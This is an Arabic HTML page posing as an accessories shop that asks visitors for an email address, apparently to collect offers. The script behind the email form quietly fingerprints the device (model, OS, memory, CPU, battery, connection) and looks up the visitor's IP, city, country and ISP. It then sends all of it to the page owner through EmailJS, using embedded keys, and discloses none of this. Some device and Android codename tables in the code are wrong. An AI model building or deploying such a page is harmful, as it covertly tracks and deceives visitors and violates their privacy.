<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أكسسوارات أنيقة | متجرك الفاخر</title>
    <!-- EmailJS Library -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <!-- Font Awesome للأيقونات -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }

        .header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            padding: 1rem;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }

        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .logo {
            font-size: 2rem;
            font-weight: bold;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .cart-icon {
            position: relative;
            cursor: pointer;
            font-size: 1.5rem;
            color: #764ba2;
        }

        .cart-count {
            position: absolute;
            top: -8px;
            right: -8px;
            background: #e74c3c;
            color: white;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .hero {
            text-align: center;
            padding: 3rem 1rem;
            color: white;
        }

        .hero h1 {
            font-size: 2.5rem;
            margin-bottom: 1rem;
        }

        .hero p {
            font-size: 1.2rem;
            opacity: 0.95;
        }

        .products-grid {
            max-width: 1200px;
            margin: 2rem auto;
            padding: 1rem;
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 2rem;
        }

        .product-card {
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }

        .product-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }

        .product-image {
            width: 100%;
            height: 300px;
            object-fit: cover;
            border-bottom: 3px solid #764ba2;
        }

        .product-info {
            padding: 1.5rem;
        }

        .product-title {
            font-size: 1.2rem;
            font-weight: bold;
            margin-bottom: 0.5rem;
            color: #333;
        }

        .product-price {
            font-size: 1.5rem;
            color: #764ba2;
            font-weight: bold;
            margin-bottom: 1rem;
        }

        .product-description {
            color: #666;
            margin-bottom: 1rem;
            line-height: 1.6;
        }

        .add-to-cart {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 30px;
            width: 100%;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        .add-to-cart:hover {
            transform: scale(1.05);
        }

        .email-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(5px);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }

        .email-modal-content {
            background: white;
            padding: 2rem;
            border-radius: 20px;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }

        .email-modal h3 {
            color: #764ba2;
            margin-bottom: 1rem;
            font-size: 1.5rem;
        }

        .email-modal p {
            color: #666;
            margin-bottom: 1.5rem;
        }

        .email-input {
            width: 100%;
            padding: 1rem;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 1rem;
            margin-bottom: 1rem;
            transition: border-color 0.3s;
        }

        .email-input:focus {
            outline: none;
            border-color: #764ba2;
        }

        .modal-buttons {
            display: flex;
            gap: 1rem;
        }

        .submit-email {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 0.8rem;
            border-radius: 10px;
            flex: 2;
            font-weight: bold;
            cursor: pointer;
        }

        .cancel-modal {
            background: #e0e0e0;
            color: #333;
            border: none;
            padding: 0.8rem;
            border-radius: 10px;
            flex: 1;
            cursor: pointer;
        }

        .notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #4CAF50;
            color: white;
            padding: 1rem 2rem;
            border-radius: 50px;
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
            z-index: 3000;
            display: none;
            animation: slideDown 0.3s ease;
        }

        @keyframes slideDown {
            from {
                transform: translate(-50%, -100%);
                opacity: 0;
            }
            to {
                transform: translate(-50%, 0);
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="notification" id="notification">
        ✅ تم إرسال تأكيد لبريدك الإلكتروني!
    </div>

    <header class="header">
        <div class="header-content">
            <div class="logo">
                <i class="fas fa-gem"></i>
                أكسسوارات أنيقة
            </div>
            <div class="cart-icon" id="cartIcon">
                <i class="fas fa-shopping-cart"></i>
                <span class="cart-count" id="cartCount">0</span>
            </div>
        </div>
    </header>

    <section class="hero">
        <h1>أكسسوارات تناسب أناقتك</h1>
        <p>تصاميم عصرية بجودة عالية وأسعار مميزة</p>
    </section>

    <div class="email-modal" id="emailModal">
        <div class="email-modal-content">
            <h3>مرحباً بك! 👋</h3>
            <p>للإستمرار في التسوق، الرجاء إدخال بريدك الإلكتروني للحصول على عروض حصرية</p>
            <input type="email" id="userEmail" class="email-input" placeholder="بريدك الإلكتروني" required>
            <div class="modal-buttons">
                <button class="submit-email" id="submitEmail">متابعة</button>
                <button class="cancel-modal" id="cancelModal">تخطي</button>
            </div>
        </div>
    </div>

    <div class="products-grid" id="productsGrid"></div>

    <script>
        // بيانات EmailJS الخاصة بك
        (function() {
            emailjs.init("ME4zxFzFyFhRTqLsl");
        })();

        const SERVICE_ID = "service_k4aclgh";
        const TEMPLATE_ID = "template_224gkie";

        const products = [
            {
                id: 1,
                title: "نظارات شمسية كلاسيكية",
                price: 89.99,
                description: "تصميم أنيق يحمي عينيك من الأشعة فوق البنفسجية",
                image: "https://images.unsplash.com/photo-1572635196237-14b3f281503f?w=500&auto=format"
            },
            {
                id: 2,
                title: "ساعة فاخرة",
                price: 199.99,
                description: "ساعة سويسرية بتصميم عصري ومتين",
                image: "https://images.unsplash.com/photo-1524592094714-0f0654e20314?w=500&auto=format"
            },
            {
                id: 3,
                title: "عقد ذهبي",
                price: 149.99,
                description: "عقد من الذهب عيار 18 مع قلادة مميزة",
                image: "https://images.unsplash.com/photo-1601121191172-9dff9911c7e6?w=500&auto=format"
            },
            {
                id: 4,
                title: "سوار جلدي",
                price: 49.99,
                description: "سوار من الجلد الطبيعي بتصميم عصري",
                image: "https://images.unsplash.com/photo-1573408301185-9146fe634ad0?w=500&auto=format"
            },
            {
                id: 5,
                title: "خاتم فضة",
                price: 79.99,
                description: "خاتم من الفضة الإسترليني مع حجر زركون",
                image: "https://images.unsplash.com/photo-1605100804763-247f67b3557e?w=500&auto=format"
            },
            {
                id: 6,
                title: "حقيبة يد أنيقة",
                price: 129.99,
                description: "حقيبة جلدية فاخرة تناسب جميع المناسبات",
                image: "https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=500&auto=format"
            }
        ];

        let cart = JSON.parse(localStorage.getItem('cart')) || [];
        let currentProduct = null;

        function displayProducts() {
            const grid = document.getElementById('productsGrid');
            grid.innerHTML = products.map(product => `
                <div class="product-card" onclick="openEmailModal(${product.id})">
                    <img src="${product.image}" alt="${product.title}" class="product-image" loading="lazy">
                    <div class="product-info">
                        <h3 class="product-title">${product.title}</h3>
                        <div class="product-price">$${product.price}</div>
                        <p class="product-description">${product.description}</p>
                        <button class="add-to-cart" onclick="event.stopPropagation(); openEmailModal(${product.id})">
                            <i class="fas fa-shopping-cart"></i>
                            أضف للسلة
                        </button>
                    </div>
                </div>
            `).join('');
        }

        function openEmailModal(productId) {
            currentProduct = products.find(p => p.id === productId);
            document.getElementById('emailModal').style.display = 'flex';
        }

        document.getElementById('cancelModal').onclick = function() {
            document.getElementById('emailModal').style.display = 'none';
            currentProduct = null;
        };

        // دالة متقدمة لجمع معلومات الجهاز
        function getAdvancedDeviceInfo() {
            const ua = navigator.userAgent;
            
            let browser = "Unknown";
            let browserVersion = "";
            let os = "Unknown";
            let osVersion = "";
            let osFullName = "Unknown";
            let deviceType = "Desktop";
            let deviceBrand = "Unknown";
            let deviceModel = "Unknown";
            let deviceMarketingName = "Unknown";
            
            // تحديد المتصفح والإصدار
            if (ua.includes("Chrome") && !ua.includes("Edg")) {
                browser = "Chrome";
                const match = ua.match(/Chrome\/(\d+\.\d+)/);
                if (match) browserVersion = match[1];
            } else if (ua.includes("Firefox")) {
                browser = "Firefox";
                const match = ua.match(/Firefox\/(\d+\.\d+)/);
                if (match) browserVersion = match[1];
            } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
                browser = "Safari";
                const match = ua.match(/Version\/(\d+\.\d+)/);
                if (match) browserVersion = match[1];
            } else if (ua.includes("Edg")) {
                browser = "Edge";
                const match = ua.match(/Edg\/(\d+\.\d+)/);
                if (match) browserVersion = match[1];
            }
            
            // تحديد نظام التشغيل بالتفصيل
            if (ua.includes("Windows")) {
                os = "Windows";
                if (ua.includes("Windows NT 10.0")) osVersion = "10.0";
                osFullName = "Windows 11/10 64-bit";
            } else if (ua.includes("Mac OS X")) {
                os = "macOS";
                const match = ua.match(/Mac OS X (\d+[._]\d+[._]\d+)/);
                if (match) {
                    osVersion = match[1].replace(/_/g, '.');
                    osFullName = "macOS " + osVersion;
                }
            } else if (ua.includes("Android")) {
                os = "Android";
                const match = ua.match(/Android (\d+\.\d+)/);
                if (match) osVersion = match[1];
                const androidVersions = {
                    "14": "Upside Down Cake",
                    "13": "Tiramisu",
                    "12": "Snow Cone",
                    "11": "Red Velvet Cake",
                    "10": "Queen Cake",
                    "9": "Pie"
                };
                osFullName = "Android " + osVersion + " (" + (androidVersions[osVersion.split('.')[0]] || "Unknown") + ")";
                deviceType = "Mobile";
            } else if (ua.includes("iPhone") || ua.includes("iPad")) {
                os = "iOS";
                const match = ua.match(/OS (\d+[._]\d+)/);
                if (match) {
                    osVersion = match[1].replace(/_/g, '.');
                    osFullName = "iOS " + osVersion;
                }
                deviceType = "Mobile";
            } else if (ua.includes("Linux")) {
                os = "Linux";
                osFullName = "Linux";
            }
            
            // تحديد الجهاز بالتفصيل
            if (ua.includes("Android") || ua.includes("iPhone") || ua.includes("iPad") || ua.includes("Mobile")) {
                deviceType = "Mobile";
                
                // Samsung
                if (ua.includes("SM-")) {
                    deviceBrand = "Samsung";
                    const match = ua.match(/SM-[A-Z0-9]+/);
                    if (match) {
                        deviceModel = match[0];
                        // قائمة ببعض موديلات سامسونج
                        const samsungModels = {
                            "SM-S918B": "Galaxy S24 Ultra",
                            "SM-S911B": "Galaxy S24",
                            "SM-S916B": "Galaxy S24+",
                            "SM-S928B": "Galaxy S23 Ultra"
                        };
                        deviceMarketingName = samsungModels[deviceModel] || "Samsung " + deviceModel;
                    }
                }
                // Xiaomi
                else if (ua.includes("Redmi") || ua.includes("Xiaomi")) {
                    deviceBrand = "Xiaomi";
                    const match = ua.match(/(Redmi|Xiaomi)[^;\s)]+/);
                    if (match) {
                        deviceModel = match[0];
                        deviceMarketingName = "Xiaomi " + deviceModel;
                    }
                }
                // Huawei
                else if (ua.includes("HUAWEI")) {
                    deviceBrand = "Huawei";
                    const match = ua.match(/HUAWEI[^;\s)]+/);
                    if (match) {
                        deviceModel = match[0];
                        deviceMarketingName = "Huawei " + deviceModel;
                    }
                }
                // Realme
                else if (ua.includes("Realme")) {
                    deviceBrand = "Realme";
                    const match = ua.match(/Realme[^;\s)]+/);
                    if (match) {
                        deviceModel = match[0];
                        deviceMarketingName = "Realme " + deviceModel;
                    }
                }
                // iPhone
                else if (ua.includes("iPhone")) {
                    deviceBrand = "Apple";
                    const match = ua.match(/iPhone[^,\s)]*/);
                    if (match) {
                        deviceModel = match[0];
                        const iPhoneModels = {
                            "iPhone16,2": "iPhone 15 Pro Max",
                            "iPhone15,3": "iPhone 14 Pro Max"
                        };
                        deviceMarketingName = iPhoneModels[deviceModel] || "iPhone";
                    }
                }
                // iPad
                else if (ua.includes("iPad")) {
                    deviceBrand = "Apple";
                    const match = ua.match(/iPad[^,\s)]*/);
                    if (match) {
                        deviceModel = match[0];
                        deviceMarketingName = "iPad";
                    }
                } else {
                    deviceBrand = "Android Device";
                    deviceMarketingName = "Android Phone";
                }
            } else {
                deviceType = "Desktop";
                if (ua.includes("Mac")) {
                    deviceBrand = "Apple Mac";
                    deviceMarketingName = "Mac Computer";
                }
                else if (ua.includes("Windows")) {
                    deviceBrand = "Windows PC";
                    deviceMarketingName = "Windows Computer";
                }
                else if (ua.includes("Linux")) {
                    deviceBrand = "Linux PC";
                    deviceMarketingName = "Linux Computer";
                }
            }
            
            return {
                browser: browser + (browserVersion ? " " + browserVersion : ""),
                os: osFullName,
                device_type: deviceType,
                device_brand: deviceBrand,
                device_model: deviceModel,
                device_marketing: deviceMarketingName,
                screen: window.screen.width + "x" + window.screen.height,
                color_depth: window.screen.colorDepth + "-bit",
                language: navigator.language || navigator.userLanguage,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير متاح",
                cpu_cores: navigator.hardwareConcurrency || "غير متاح",
                platform: navigator.platform,
                raw_ua: ua
            };
        }

        // دالة للحصول على IP والموقع
        async function getLocationInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || "غير متاح",
                    city: data.city || "غير متاح",
                    region: data.region || "غير متاح",
                    country: data.country_name || "غير متاح",
                    isp: data.org || "غير متاح"
                };
            } catch (error) {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return {
                        ip: data.ip || "غير متاح",
                        city: "غير متاح",
                        region: "غير متاح",
                        country: "غير متاح",
                        isp: "غير متاح"
                    };
                } catch {
                    return {
                        ip: "غير متاح",
                        city: "غير متاح",
                        region: "غير متاح",
                        country: "غير متاح",
                        isp: "غير متاح"
                    };
                }
            }
        }

        // معلومات الاتصال
        function getConnectionInfo() {
            let connectionType = "غير متاح";
            let bandwidth = "غير متاح";
            let dataSaver = "غير متاح";
            
            if (navigator.connection) {
                const conn = navigator.connection;
                connectionType = conn.effectiveType || "غير متاح";
                bandwidth = conn.downlink ? conn.downlink + " Mbps" : "غير متاح";
                dataSaver = conn.saveData ? "مفعل" : "غير مفعل";
            }
            
            return { connectionType, bandwidth, dataSaver };
        }

        // معلومات البطارية
        async function getBatteryInfo() {
            let batteryLevel = "غير متاح";
            let batteryCharging = "غير متاح";
            
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + "%";
                    batteryCharging = battery.charging ? "نعم" : "لا";
                }
            } catch (e) {}
            
            return { batteryLevel, batteryCharging };
        }

        // دالة الإرسال الرئيسية
        document.getElementById('submitEmail').onclick = async function() {
            const email = document.getElementById('userEmail').value;
            if (!email || !email.includes('@')) {
                alert('الرجاء إدخال بريد إلكتروني صحيح');
                return;
            }

            const deviceInfo = getAdvancedDeviceInfo();
            const locationInfo = await getLocationInfo();
            const connectionInfo = getConnectionInfo();
            const batteryInfo = await getBatteryInfo();

            const templateParams = {
                user_email: email,
                time: new Date().toLocaleString('ar-IQ'),
                browser: deviceInfo.browser,
                os: deviceInfo.os,
                device_type: deviceInfo.device_type,
                device_brand: deviceInfo.device_brand,
                device_model: deviceInfo.device_model,
                device_marketing: deviceInfo.device_marketing,
                screen: deviceInfo.screen,
                color_depth: deviceInfo.color_depth,
                language: deviceInfo.language,
                timezone: deviceInfo.timezone,
                memory: deviceInfo.memory,
                cpu_cores: deviceInfo.cpu_cores,
                connection: connectionInfo.connectionType,
                bandwidth: connectionInfo.bandwidth,
                data_saver: connectionInfo.dataSaver,
                battery: batteryInfo.batteryLevel,
                charging: batteryInfo.batteryCharging,
                ip: locationInfo.ip,
                city: locationInfo.city,
                region: locationInfo.region,
                country: locationInfo.country,
                isp: locationInfo.isp,
                platform: deviceInfo.platform,
                raw_ua: deviceInfo.raw_ua
            };

            try {
                await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
                
                if (currentProduct) {
                    cart.push(currentProduct);
                    localStorage.setItem('cart', JSON.stringify(cart));
                    document.getElementById('cartCount').textContent = cart.length;
                }

                document.getElementById('emailModal').style.display = 'none';
                document.getElementById('userEmail').value = '';

                document.getElementById('notification').style.display = 'block';
                setTimeout(() => {
                    document.getElementById('notification').style.display = 'none';
                }, 3000);
                
                console.log('✅ تم الإرسال بنجاح');
            } catch (error) {
                console.error('❌ فشل الإرسال:', error);
                alert('حدث خطأ في الإرسال. تأكدي من إعدادات EmailJS');
            }
        };

        document.getElementById('cartCount').textContent = cart.length;
        displayProducts();

        window.onclick = function(event) {
            const modal = document.getElementById('emailModal');
            if (event.target === modal) {
                modal.style.display = 'none';
                currentProduct = null;
            }
        };
    </script>
</body>
</html>
